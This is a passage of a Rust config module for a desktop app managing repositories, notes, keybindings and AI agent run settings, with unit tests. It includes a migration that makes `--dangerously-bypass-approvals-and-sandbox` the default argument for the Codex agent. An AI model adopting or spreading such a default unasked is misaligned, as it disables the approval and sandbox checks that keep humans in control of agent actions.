/// Re-validates EVERY requested path against the classifier using the
/// document as it stands on disk *right now*, inside the same file lock as
/// the write. A path that no longer classifies (reconnected, edited, or never
/// stale to begin with — a stale preview, a race with another client, or a
/// caller that skipped the preview) fails the WHOLE request before anything
/// is written: this is one versioned transactional delta, not a best-effort
/// sweep, so a partially-stale request must not silently repair the rest.
///
/// An exact backup of the pre-repair document is written to
/// `repositories.repair-backup-<UTC timestamp>.json` in the config directory
/// before the mutation. That backup is deliberately a human recovery artifact
/// for *after* a successful repair the user wants to undo — it is not what
/// makes a *failed* write safe. `ConfigFile::write_atomic` (temp file +
/// fsync + rename) already guarantees a failed write never partially
/// overwrites the live document, so there is nothing to "restore" in that
/// case: the original file was never touched. Recorded as a deliberate design
/// trade-off in story 763-d219's worklog rather than layering a second,
/// redundant restore-on-failure path on top of an already-atomic write.
pub(crate) fn repair_stale_temp_repositories_request(
    paths: Vec<String>,
) -> Result<StaleTempRepairSummary, String> {
    if paths.is_empty() {
        return Err("repair_stale_temp_repositories: no paths named".to_string());
    }
    // Dedupe up front, preserving first-occurrence order: a caller repeating a
    // path (a double-click, a retried request) must not echo it twice in
    // `summary.removed`, and downstream this is the single list every other
    // step iterates — no second place that could disagree on how many rows
    // this request actually names.
    let mut seen = std::collections::HashSet::with_capacity(paths.len());
    let paths: Vec<String> = paths
        .into_iter()
        .filter(|p| seen.insert(p.clone()))
        .collect();
    let requested: std::collections::HashSet<&str> = paths.iter().map(String::as_str).collect();

    let file: ConfigFile<serde_json::Value> = ConfigFile::at_path(repository_file());
    file.update_with_strict(|doc| {
        if doc.is_null() {
            *doc = serde_json::Value::Object(serde_json::Map::new());
        }
        let root = doc
            .as_object_mut()
            .ok_or_else(|| "repositories.json root must be an object".to_string())?;
        let repos = root
            .get("repos")
            .and_then(|v| v.as_object())
            .cloned()
            .unwrap_or_default();

        let mut invalid = Vec::new();
        for path in &paths {
            let matches_now = repos
                .get(path.as_str())
                .is_some_and(|repo| classify_stale_temp_repo(path, repo).is_some());
            if !matches_now {
                invalid.push(path.clone());
            }
        }
        if !invalid.is_empty() {
            return Err(format!(
                "repair refused — no longer a stale-temp candidate on disk (reload and retry): {}",
                invalid.join(", ")
            ));
        }

        // Backup taken from the exact document this repair is about to mutate,
        // written before any mutation, inside the same file lock — no window
        // where a concurrent writer could land between backup and mutation.
        let backup_json = serde_json::to_string_pretty(doc).map_err(|e| e.to_string())?;
        let timestamp = chrono::Utc::now().format("%Y%m%dT%H%M%S%.3fZ");
        let backup_path = config_dir().join(format!("repositories.repair-backup-{timestamp}.json"));
        persist_atomic(&backup_path, backup_json.as_bytes())?;

        let root = doc.as_object_mut().expect("validated as an object above");
        if let Some(repos) = root.get_mut("repos").and_then(|v| v.as_object_mut()) {
            for path in &paths {
                repos.remove(path);
            }
        }
        if let Some(order) = root.get_mut("repoOrder").and_then(|v| v.as_array_mut()) {
            order.retain(|v| v.as_str().is_none_or(|p| !requested.contains(p)));
        }
        if let Some(groups) = root.get_mut("groups").and_then(|v| v.as_object_mut()) {
            for group in groups.values_mut() {
                if let Some(order) = group
                    .as_object_mut()
                    .and_then(|g| g.get_mut("repoOrder"))
                    .and_then(|v| v.as_array_mut())
                {
                    order.retain(|v| v.as_str().is_none_or(|p| !requested.contains(p)));
                }
            }
        }
        if let Some(active) = root.get("activeRepoPath").and_then(|v| v.as_str())
            && requested.contains(active)
        {
            root.insert("activeRepoPath".to_string(), serde_json::Value::Null);
        }

        Ok((
            StaleTempRepairSummary {
                removed: paths.clone(),
                backup_path: backup_path.to_string_lossy().to_string(),
            },
            true,
        ))
    })
}

/// Desktop IPC twin of `POST /config/repositories/stale-temp` — see
/// `save_repositories` above for why the state param exists: a successful
/// repair is a document change every other open window must re-read.
#[cfg(feature = "desktop")]
#[tauri::command]
pub(crate) fn repair_stale_temp_repositories(
    state: tauri::State<'_, std::sync::Arc<crate::state::AppState>>,
    paths: Vec<String>,
) -> Result<StaleTempRepairSummary, String> {
    let summary = repair_stale_temp_repositories_request(paths)?;
    state.notify_repositories_changed();
    Ok(summary)
}

// Pane layout (schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_pane_layout() -> serde_json::Value {
    load_json_config(PANE_LAYOUT_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_pane_layout(
    base: serde_json::Value,
    layout: serde_json::Value,
) -> Result<(), String> {
    let file: ConfigFile<serde_json::Value> = ConfigFile::new(PANE_LAYOUT_FILE);
    file.save_delta(&base, &layout)
}

// Prompt library
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_prompt_library() -> PromptLibraryConfig {
    load_json_config(PROMPT_LIBRARY_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_prompt_library(
    base: PromptLibraryConfig,
    config: PromptLibraryConfig,
) -> Result<(), String> {
    let file: ConfigFile<PromptLibraryConfig> = ConfigFile::new(PROMPT_LIBRARY_FILE);
    file.save_delta(&base, &config)
}

// Notes (opaque JSON — schema owned by frontend)
//
// Unlike every other config this one FAILS instead of defaulting: the frontend refuses to
// persist until a load succeeds, so an unreadable notes.json can no longer be silently
// replaced by an empty array on the next mutation (GH #107).
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_notes() -> Result<serde_json::Value, String> {
    load_json_config_strict(NOTES_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_notes(base: serde_json::Value, config: serde_json::Value) -> Result<(), String> {
    let file: ConfigFile<serde_json::Value> = ConfigFile::new(NOTES_FILE);
    file.save_delta_strict(&base, &config)
}

// Activity center (opaque JSON — schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_activity() -> serde_json::Value {
    load_json_config(ACTIVITY_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_activity(
    base: serde_json::Value,
    items: serde_json::Value,
) -> Result<(), String> {
    let file: ConfigFile<serde_json::Value> = ConfigFile::new(ACTIVITY_FILE);
    file.save_delta(&base, &items)
}

// Keybindings (opaque JSON — schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_keybindings() -> serde_json::Value {
    load_json_config(KEYBINDINGS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_keybindings(
    base: serde_json::Value,
    config: serde_json::Value,
) -> Result<(), String> {
    let file: ConfigFile<serde_json::Value> = ConfigFile::new(KEYBINDINGS_FILE);
    file.save_delta(&base, &config)
}

// Agents config
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_agents_config() -> AgentsConfig {
    let file: ConfigFile<AgentsConfig> = ConfigFile::new(AGENTS_CONFIG_FILE);
    match file.update_with_strict(|config| {
        // Older typed agents.json writers discard unknown fields. Keep the
        // durable migration bit outside their document, under the existing lock.
        let stamp = config_dir().join("codex-bypass-migrated");
        if stamp.try_exists().map_err(|error| error.to_string())? {
            let settings = config.agents.entry("codex".into()).or_default();
            let changed = !settings.codex_bypass_migrated;
            settings.codex_bypass_migrated = true;
            return Ok((config.clone(), changed));
        }
        let changed = migrate_codex_bypass(config);
        persist_atomic(&stamp, b"1")?;
        Ok((config.clone(), changed))
    }) {
        Ok(config) => config,
        Err(error) => {
            tracing::error!(source = "config", "Codex args migration failed: {error}");
            load_json_config(AGENTS_CONFIG_FILE)
        }
    }
}

pub(crate) const CODEX_BYPASS_ARG: &str = "--dangerously-bypass-approvals-and-sandbox";

fn migrate_codex_bypass(config: &mut AgentsConfig) -> bool {
    let settings = config.agents.entry("codex".into()).or_default();
    if settings.codex_bypass_migrated {
        return false;
    }
    if settings.run_configs.is_empty() {
        settings.run_configs.push(AgentRunConfig {
            name: "Codex Default".into(),
            command: "codex".into(),
            args: vec![CODEX_BYPASS_ARG.into()],
            model: None,
            env: HashMap::new(),
            is_default: true,
        });
    } else {
        let index = settings
            .run_configs
            .iter()
            .position(|rc| rc.is_default)
            .unwrap_or(0);
        let rc = &mut settings.run_configs[index];
        let name = rc.command.rsplit(['/', '\\']).next().unwrap_or(&rc.command);
        let direct = std::path::Path::new(name)
            .file_stem()
            .and_then(|s| s.to_str())
            .is_some_and(|s| s.eq_ignore_ascii_case("codex"));
        if direct
            && !rc
                .args
                .iter()
                .take_while(|arg| arg.as_str() != "--")
                .any(|arg| arg == CODEX_BYPASS_ARG)
        {
            rc.args.insert(0, CODEX_BYPASS_ARG.into());
        }
    }
    settings.codex_bypass_migrated = true;
    true
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_agents_config(base: AgentsConfig, config: AgentsConfig) -> Result<(), String> {
    let file: ConfigFile<AgentsConfig> = ConfigFile::new(AGENTS_CONFIG_FILE);
    file.save_delta(&base, &config)
}

// ---------------------------------------------------------------------------
// Config defaults — read-only, cross-domain, for Settings "expert mode"
// ---------------------------------------------------------------------------

/// The default value of every config domain a Settings page edits. An expert
/// control compares its live value against the matching field here to decide
/// whether it is "at default" (hidden in basic mode) or "modified" (always
/// shown). Fields use each domain's defaults and its startup migrations — the same
/// value deserialization falls back to when a config file is missing or a
/// field is absent (see `load_json_config`) — never a hand-copied literal.
#[derive(Serialize)]
pub(crate) struct ConfigDefaults {
    pub(crate) app: AppConfig,
    pub(crate) notifications: NotificationConfig,
    /// Default for one entry of `AgentsConfig::agents` — there is no single
    /// "default" for the map itself, only for an unconfigured agent's settings.
    pub(crate) agent_settings: AgentSettings,
    pub(crate) repo_defaults: RepoDefaultsConfig,
    /// `AgentsConfig`-level fields such as `headless_agent`. `None` fields are
    /// omitted by `skip_serializing_if`; a missing key means `null`.
    pub(crate) agents: AgentsConfig,
    /// Additional GitHub accounts (`github_accounts.json`); the default is no
    /// account. Settings hides the "Add another GitHub account" entry point
    /// while the registry is at this default.
    pub(crate) github_accounts: crate::github_account::GitHubAccountRegistry,
    /// Absent (not merely empty) outside desktop builds: `mod dictation` does
    /// not exist under `--no-default-features` (e.g. `tuic-remote`), and this
    /// route is never registered there either (see `build_remote_router`).
    #[cfg(feature = "dictation")]
    pub(crate) dictation: DictationConfig,
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn get_config_defaults() -> ConfigDefaults {
    let mut agents = AgentsConfig::default();
    migrate_codex_bypass(&mut agents);
    ConfigDefaults {
        app: AppConfig::default(),
        notifications: NotificationConfig::default(),
        agent_settings: AgentSettings::default(),
        repo_defaults: RepoDefaultsConfig::default(),
        agents,
        github_accounts: crate::github_account::GitHubAccountRegistry::default(),
        // `speech_engine` is empty in the struct so a file without it can be
        // told apart from a choice (`dictation::commands`); a brand-new install
        // loads it as "edge", and the settings panel compares against that.
        #[cfg(feature = "dictation")]
        dictation: DictationConfig {
            speech_engine: "edge".to_string(),
            ..DictationConfig::default()
        },
    }
}

// ---------------------------------------------------------------------------
// Note images — save/delete/get for Ideas panel image attachments
// ---------------------------------------------------------------------------

pub(crate) const NOTE_IMAGES_DIR: &str = "note-images";

/// Maximum decoded image size: 10 MB
const MAX_IMAGE_SIZE: usize = 10 * 1024 * 1024;

/// Validate a note ID to prevent path traversal attacks.
/// Rejects IDs containing `/`, `\`, `..`, or null bytes.
fn validate_note_id(note_id: &str) -> Result<(), String> {
    if note_id.is_empty() {
        return Err("note_id must not be empty".to_string());
    }
    if note_id.contains('/')
        || note_id.contains('\\')
        || note_id.contains("..")
        || note_id.contains('\0')
    {
        return Err("note_id contains invalid characters".to_string());
    }
    Ok(())
}

/// Save a base64-encoded image to `config_dir()/note-images/<note_id>/<timestamp>.<extension>`.
/// Returns the absolute path of the saved file.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_note_image(
    note_id: String,
    data_base64: String,
    extension: String,
) -> Result<String, String> {
    use base64::{Engine as _, engine::general_purpose};

    validate_note_id(&note_id)?;

    let bytes = general_purpose::STANDARD
        .decode(&data_base64)
        .map_err(|e| format!("Invalid base64 data: {e}"))?;

    if bytes.len() > MAX_IMAGE_SIZE {
        return Err(format!(
            "Image too large: {} bytes (max {} bytes)",
            bytes.len(),
            MAX_IMAGE_SIZE
        ));
    }

    // Sanitize extension to alphanumeric only
    let ext = extension
        .chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .collect::<String>();
    let ext = if ext.is_empty() {
        "png".to_string()
    } else {
        ext
    };

    let dir = config_dir().join(NOTE_IMAGES_DIR).join(&note_id);
    std::fs::create_dir_all(&dir).map_err(|e| format!("Failed to create note-images dir: {e}"))?;

    let filename = format!(
        "{}.{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis(),
        ext
    );
    let path = dir.join(&filename);

    persist_atomic(&path, &bytes)?;

    Ok(path.to_string_lossy().to_string())
}

/// Delete all image assets for a note. No-op if the directory doesn't exist.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn delete_note_assets(note_id: String) -> Result<(), String> {
    validate_note_id(&note_id)?;

    let dir = config_dir().join(NOTE_IMAGES_DIR).join(&note_id);
    if dir.exists() {
        std::fs::remove_dir_all(&dir).map_err(|e| format!("Failed to delete note assets: {e}"))?;
    }
    Ok(())
}

/// Delete image assets for multiple notes in a single IPC round-trip.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn delete_note_assets_batch(note_ids: Vec<String>) -> Result<(), String> {
    let base = config_dir().join(NOTE_IMAGES_DIR);
    for note_id in &note_ids {
        validate_note_id(note_id)?;
        let dir = base.join(note_id);
        if dir.exists() {
            std::fs::remove_dir_all(&dir)
                .map_err(|e| format!("Failed to delete note assets for {note_id}: {e}"))?;
        }
    }
    Ok(())
}

/// Return the absolute path of the note-images root directory.
/// The frontend needs this as `baseDir` for `convertFileSrc()`.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn get_note_images_dir() -> String {
    config_dir()
        .join(NOTE_IMAGES_DIR)
        .to_string_lossy()
        .to_string()
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    // Catches: the durable migration stamp overrides a user's later bypass opt-in.
    #[test]
    fn critic_migration_does_not_undo_deliberate_bypass_reenable() {
        let root = tempfile::tempdir_in(crate::test_support::test_temp_root()).unwrap();
        let _guard = set_config_dir_override(root.path().to_path_buf());
        let initial = load_agents_config();
        let mut removed = initial.clone();
        removed.agents.get_mut("codex").unwrap().run_configs[0]
            .args
            .clear();
        save_agents_config(initial, removed).unwrap();
        let disabled = load_agents_config();
        assert!(disabled.agents["codex"].run_configs[0].args.is_empty());
        let mut enabled = disabled.clone();
        enabled.agents.get_mut("codex").unwrap().run_configs[0].args =
            vec!["--dangerously-bypass-approvals-and-sandbox".into()];
        save_agents_config(disabled, enabled).unwrap();
        for _ in 0..2 {
            assert_eq!(
                load_agents_config().agents["codex"].run_configs[0].args,
                vec!["--dangerously-bypass-approvals-and-sandbox"]
            );
        }
    }

    use super::*;
    use std::fs;
    use tempfile::TempDir;

    /// The save path minus the broadcast. The desktop command wraps
    /// `save_repositories_request` only to announce `repositories-changed`, which
    /// needs an `AppState` these tests have no reason to build; every assertion
    /// here is about the document on disk. Shadows the command deliberately —
    /// a local item wins over the `use super::*` glob.
    fn save_repositories(config: serde_json::Value) -> Result<(), String> {
        save_repositories_request(config)
            .map(|_| ())
            .map_err(|error| error.to_string())
    }

    /// #763-d219 — between 2026-09-11 and 2026-09-13, fifteen `tempfile` roots
    /// (`/private/var/folders/…/T/.tmpXXXXXX` and `~/Gits/.tmp/.tmpXXXXXX`)
    /// appeared as repositories in Boss's real `repositories.json`. They got
    /// there because `config_dir` used to fall back to the *user's* directory
    /// whenever a test forgot `set_config_dir_override`: the leak was silent,
    /// so every such test wrote its disposable fixture into production state.
    ///
    /// A test build must never be able to name that directory, with or
    /// without an explicit override. A first attempt made the no-override
    /// branch panic instead, which is loud but reintroduced a worse failure
    /// mode: a `#[should_panic]` test exercising exactly this panic poisoned
    /// `CONFIG_DIR_OVERRIDE` on unwind (a temporary `MutexGuard` was still
    /// alive through the panicking expression) and a subsequent
    /// `.lock().unwrap()` on it during `Drop` aborted the whole process
    /// (SIGABRT), and — independently — any test that set its own override
    /// via an `isolated_config()`-style helper and THEN called a shared
    /// helper that also tried to set one self-deadlocked on
    /// `CONFIG_DIR_EXCLUSIVE`, which is not reentrant. `test_fallback_config_dir`
    /// is the fix: a safe, process-scoped, non-production fallback rather
    /// than a panic — see its own doc comment for why silent-but-safe beats
    /// loud-but-fragile here.
    #[test]
    fn config_dir_in_a_test_never_names_the_real_user_directory() {
        let _exclusive = without_config_dir_override();
        let resolved = config_dir();
        assert!(
            resolved.starts_with(crate::test_support::test_temp_root()),
            "with no override in scope, config_dir() must resolve under the checkout's test temp \
             directory, never the platform config directory: got {}",
            resolved.display()
        );
    }

    /// Root's audit requirement for #763-d219: prove the fallback and the real
    /// platform directory can never coincide, not just assume it from where
    /// the fallback happens to be constructed. `dirs::config_dir()` is a pure
    /// lookup (no side effects, no directory creation) — safe to call directly
    /// here without going through the guarded `config_dir()` wrapper.
    #[test]
    fn fallback_config_dir_is_never_the_real_directory() {
        let _exclusive = without_config_dir_override();
        let fallback = config_dir();
        if let Some(real_platform_dir) = dirs::config_dir() {
            assert_ne!(
                fallback,
                real_platform_dir.join("com.tuic.commander"),
                "the test fallback must never equal the real platform config directory"
            );
        }
        if let Some(home) = dirs::home_dir() {
            assert_ne!(
                fallback,
                home.join(".tuicommander"),
                "the test fallback must never equal the legacy dotdir fallback either"
            );
        }
    }

    /// The fallback is a `OnceLock` — the same value every time within one
    /// process, which is exactly the "no override, but consistent within this
    /// test" behavior a test relying on repeated `config_dir()` calls needs.
    #[test]
    fn fallback_config_dir_is_stable_across_calls_in_the_same_process() {
        let _exclusive = without_config_dir_override();
        assert_eq!(config_dir(), config_dir());
    }

    /// The guard the test above uses must actually restore the override, or it
    /// would poison every test that runs after it in the same process.
    #[test]
    fn clearing_the_override_does_not_outlive_its_guard() {
        let dir = TempDir::new().expect("temp dir");
        {
            let _cleared = without_config_dir_override();
        }
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        assert_eq!(config_dir(), dir.path());
    }

    /// Helper: run load/save with a temp directory to avoid touching real config.
    /// We override config_dir by writing directly to a temp path and reading back.
    fn round_trip_in_dir<T: Serialize + DeserializeOwned + Default>(
        dir: &std::path::Path,
        filename: &str,
        value: &T,
    ) -> T {
        let path = dir.join(filename);
        let json = serde_json::to_string_pretty(value).unwrap();
        fs::write(&path, json).unwrap();
        let read_back: T = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        read_back
    }

    // GH #107 — notes must never fall back to Default on a broken file, or the frontend
    // hydrates empty and the next mutation atomically overwrites the real notes.
    #[test]
    fn strict_load_returns_default_for_a_missing_file() {
        let dir = TempDir::new().expect("temp dir");
        let loaded =
            load_json_config_strict_from_path::<serde_json::Value>(&dir.path().join("notes.json"));
        assert_eq!(loaded, Ok(serde_json::Value::Null));
    }

    #[test]
    fn strict_load_errors_and_preserves_a_corrupt_file() {
        let dir = TempDir::new().expect("temp dir");
        let path = dir.path().join("notes.json");
        fs::write(&path, "{ this is not json").unwrap();

        let loaded = load_json_config_strict_from_path::<serde_json::Value>(&path);
        assert!(loaded.is_err(), "corrupt file must not load as Default");
        assert!(!path.exists(), "corrupt file must be moved aside");

        let preserved: Vec<_> = fs::read_dir(dir.path())
            .unwrap()
            .filter_map(Result::ok)
            .filter(|e| e.file_name().to_string_lossy().contains("corrupt-"))
            .collect();
        assert_eq!(preserved.len(), 1, "exactly one file kept aside");
        assert_eq!(
            fs::read_to_string(preserved[0].path()).unwrap(),
            "{ this is not json"
        );
    }

    /// Corrupt the same file `n` times, returning the content written on each
    /// pass so a test can identify which backup holds what.
    fn corrupt_n_times(path: &std::path::Path, n: usize) -> Vec<String> {
        (0..n)
            .map(|i| {
                let content = format!("{{ corrupt pass {i}");
                fs::write(path, &content).unwrap();
                let loaded = load_json_config_strict_from_path::<serde_json::Value>(path);
                assert!(loaded.is_err(), "pass {i} must not load");
                content
            })
            .collect()
    }

    #[test]
    fn corrupt_backups_are_capped_and_the_newest_always_survives() {
        let dir = TempDir::new().expect("temp dir");
        let path = dir.path().join("notes.json");

        let written = corrupt_n_times(&path, MAX_CORRUPT_BACKUPS + 3);

        let kept = corrupt_backups(dir.path());
        assert_eq!(
            kept.len(),
            MAX_CORRUPT_BACKUPS,
            "{} corruptions must leave exactly {MAX_CORRUPT_BACKUPS} backups, found {kept:?}",
            written.len()
        );

        // Criterion 3, stated as the property that matters rather than as a count:
        // the file a user would reach for is the LAST one, and no retention rule
        // may delete it. Identified by content, not by name — the uuid is random.
        let contents: Vec<String> = kept
            .iter()
            .map(|p| fs::read_to_string(p).unwrap())
            .collect();
        let newest = written.last().unwrap();
        assert!(
            contents.contains(newest),
            "the most recent backup ({newest:?}) was reaped; kept {contents:?}"
        );
    }

    #[test]
    fn reaping_is_scoped_to_one_config_file() {
        // A storm of corruptions in one file must not evict another file's only
        // backup: that would make the cleanup cause the data loss the rename
        // exists to prevent.
        let dir = TempDir::new().expect("temp dir");
        let notes = dir.path().join("notes.json");
        let repos = dir.path().join("repositories.json");

        corrupt_n_times(&repos, 1);
        corrupt_n_times(&notes, MAX_CORRUPT_BACKUPS + 3);

        let surviving: Vec<String> = corrupt_backups(dir.path())
            .iter()
            .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
            .collect();
        assert_eq!(
            surviving
                .iter()
                .filter(|n| n.starts_with("repositories.corrupt-"))
                .count(),
            1,
            "repositories' only backup was evicted by notes' churn: {surviving:?}"
        );
        assert_eq!(
            surviving
                .iter()
                .filter(|n| n.starts_with("notes.corrupt-"))
                .count(),
            MAX_CORRUPT_BACKUPS
        );
    }

    #[test]
    fn a_failed_reap_does_not_fail_the_load() {
        // The reaper runs inside a load that has ALREADY failed. Whatever it
        // cannot delete, the caller must still get its parse error and its
        // preserved file — never a different error because cleanup tripped.
        let dir = TempDir::new().expect("temp dir");
        let path = dir.path().join("notes.json");

        // A directory where a backup file is expected: `remove_file` refuses it,
        // which is the failure branch, without permission games that behave
        // differently as root or on CI. Created FIRST so it is the oldest and
        // therefore actually reaches the reap loop — created last it would sort
        // into the keep window and the test would pass without exercising
        // anything.
        let undeletable = dir.path().join("notes.corrupt-0000");
        fs::create_dir(&undeletable).unwrap();
        corrupt_n_times(&path, MAX_CORRUPT_BACKUPS + 1);

        fs::write(&path, "{ still broken").unwrap();
        let err = load_json_config_strict_from_path::<serde_json::Value>(&path)
            .expect_err("the parse error must survive a failed reap");
        assert!(err.starts_with("Corrupt "), "unexpected error: {err}");
        assert!(!path.exists(), "the bad file is still moved aside");
        assert!(
            undeletable.is_dir(),
            "the undeletable entry is left alone, not partially removed"
        );
        // The real backups are still capped: one slot is wasted on the entry that
        // cannot be removed, and the reaper does not compensate by deleting an
        // extra file. Stated as an upper bound because that waste is the honest
        // cost of not failing the load.
        let files = corrupt_backups(dir.path())
            .into_iter()
            .filter(|p| p.is_file())
            .count();
        assert!(
            files <= MAX_CORRUPT_BACKUPS,
            "{files} real backups left, expected at most {MAX_CORRUPT_BACKUPS}"
        );
    }

    #[test]
    fn strict_load_reads_a_valid_file() {
        let dir = TempDir::new().expect("temp dir");
        let path = dir.path().join("notes.json");
        fs::write(&path, r#"{"notes":[{"id":"n1"}]}"#).unwrap();

        let loaded = load_json_config_strict_from_path::<serde_json::Value>(&path)
            .expect("valid file loads");
        assert_eq!(loaded["notes"][0]["id"], "n1");
        assert!(path.exists(), "a valid file is left where it is");
    }

    /// Every `<name>.corrupt-<uuid>` file kept aside in `dir`.
    fn corrupt_backups(dir: &std::path::Path) -> Vec<PathBuf> {
        fs::read_dir(dir)
            .unwrap()
            .filter_map(Result::ok)
            .map(|e| e.path())
            .filter(|p| {
                p.file_name()
                    .and_then(|n| n.to_str())
                    .is_some_and(|n| n.contains(".corrupt-"))
            })
            .collect()
    }

    /// `config.json` is the one config file whose load does NOT go through
    /// `load_json_config_strict_from_path`: `load_app_config` turns every
    /// `read_app_config_unlocked` error into `AppConfig::default()`. The defaults it
    /// hands back have an empty session token, so `lib.rs`'s first-run branch generates
    /// one and calls `save_app_config` — a whole-document write with no read. The
    /// user's broken-but-hand-recoverable file is therefore destroyed on the FIRST
    /// restart after the corruption, not by some later hypothetical save.
    #[test]
    #[serial_test::serial]
    fn corrupt_app_config_survives_the_first_run_save_that_follows_it() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let path = dir.path().join(APP_CONFIG_FILE);
        // Truncated mid-document, the shape a crash or a hand-edit leaves behind.
        let original = r#"{"font_size": 18, "services": {"server": {"port": 9"#;
        fs::write(&path, original).unwrap();

        let loaded = load_app_config();
        assert_eq!(
            loaded.font_size,
            AppConfig::default().font_size,
            "an unparseable file cannot be read, so defaults are the only answer"
        );

        // Exactly what lib.rs:1228 does on first run.
        let mut first_run = loaded;
        first_run.services.auth.session_token = uuid::Uuid::new_v4().to_string();
        save_app_config(first_run).expect("first-run save");

        let preserved = corrupt_backups(dir.path());
        assert_eq!(
            preserved.len(),
            1,
            "the corrupt config must be kept aside before defaults are written over it"
        );
        assert_eq!(
            fs::read_to_string(&preserved[0]).unwrap(),
            original,
            "the backup must hold the user's bytes, byte for byte"
        );
    }

    /// The preservation must not be the loss it replaces: a fixed backup name would let
    /// the second corrupt load erase the first user's document, which is the same data
    /// loss one indirection further out.
    #[test]
    #[serial_test::serial]
    fn two_corrupt_app_config_loads_keep_two_distinct_backups() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let path = dir.path().join(APP_CONFIG_FILE);

        fs::write(&path, "first corrupt document").unwrap();
        load_app_config();
        fs::write(&path, "second corrupt document").unwrap();
        load_app_config();

        let backups = corrupt_backups(dir.path());
        assert_eq!(backups.len(), 2, "one backup per corrupt load");
        let mut contents: Vec<String> = backups
            .iter()
            .map(|p| fs::read_to_string(p).unwrap())
            .collect();
        contents.sort();
        assert_eq!(
            contents,
            vec![
                "first corrupt document".to_string(),
                "second corrupt document".to_string(),
            ],
            "the second backup overwrote the first"
        );
    }

    /// A `tuic-remote` restart used to change the generated session token and log
    /// out every paired phone. The token written at startup must come back from
    /// the next `load_app_config`, and the stored port must stay untouched.
    #[test]
    #[serial_test::serial]
    fn persisted_session_token_is_loaded_by_the_next_start() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        fs::write(
            dir.path().join(APP_CONFIG_FILE),
            r#"{"shell": null, "font_family": "Menlo", "font_size": 14, "theme": "dark",
                "services": {"server": {"port": 4321}}}"#,
        )
        .unwrap();

        persist_session_token("tok-restart").unwrap();

        let loaded = load_app_config();
        assert_eq!(loaded.services.auth.session_token, "tok-restart");
        assert!(loaded.services.auth.session_token_exists);
        assert_eq!(loaded.services.server.port, 4321);
    }

    /// Deleting the embedded AI engine (#784-0aec) removed `ai_chat_enabled`,
    /// `ai_triage_enabled` and `ai_watchers_enabled` from `AppConfig`. Every
    /// `config.json` written before that upgrade still carries them, so the
    /// load path has to ignore them rather than fail — `AppConfig` has no
    /// `deny_unknown_fields`, and this test is what holds that open. Note the
    /// failure mode it guards: a rejected parse does not surface as an error,
    /// it silently moves the user's file aside and writes defaults over it.
    ///
    /// The document below carries `shell`, `font_family`, `font_size` and
    /// `theme` because those four fields carry no `#[serde(default)]` and are
    /// therefore mandatory. That is a separate defect — a config.json missing
    /// any of them is discarded the same silent way — and this test deliberately
    /// does not exercise it, so a failure here can only mean the removed keys
    /// were rejected.
    #[test]
    #[serial_test::serial]
    fn a_config_written_before_the_ai_engine_was_deleted_still_loads() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let path = dir.path().join(APP_CONFIG_FILE);
        fs::write(
            &path,
            r#"{
                "shell": null,
                "font_family": "Menlo",
                "font_size": 17,
                "theme": "dark",
                "experimental_features_enabled": true,
                "ai_chat_enabled": true,
                "ai_triage_enabled": true,
                "ai_watchers_enabled": true
            }"#,
        )
        .unwrap();

        let loaded = load_app_config();

        assert_eq!(loaded.font_size, 17, "the surviving keys must be read");
        assert!(
            loaded.experimental_features_enabled,
            "experimental_features_enabled outlived its three AI sub-flags"
        );
        assert!(
            corrupt_backups(dir.path()).is_empty(),
            "the removed keys must be ignored, not treated as a corrupt document"
        );
    }

    /// Write a config whose `services.auth` carries `duration` (or no key at all).
    fn write_config_with_duration(dir: &std::path::Path, duration: Option<u64>) -> PathBuf {
        let path = dir.join(APP_CONFIG_FILE);
        let auth = match duration {
            Some(d) => serde_json::json!({ "session_token_duration_secs": d }),
            None => serde_json::json!({}),
        };
        let doc = serde_json::json!({
            "shell": null,
            "font_family": "Menlo",
            "font_size": 17,
            "theme": "dark",
            "services": { "auth": auth },
        });
        fs::write(&path, doc.to_string()).unwrap();
        path
    }

    fn duration_on_disk(path: &std::path::Path) -> serde_json::Value {
        let doc: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap();
        doc["services"]["auth"]["session_token_duration_secs"].clone()
    }

    /// Catches: configs written by the old 24h default keep logging devices out daily
    /// because the new default only applies to a missing key.
    #[test]
    #[serial_test::serial]
    fn legacy_86400_session_duration_migrates_to_30_days_and_persists() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let path = write_config_with_duration(dir.path(), Some(86_400));

        assert_eq!(
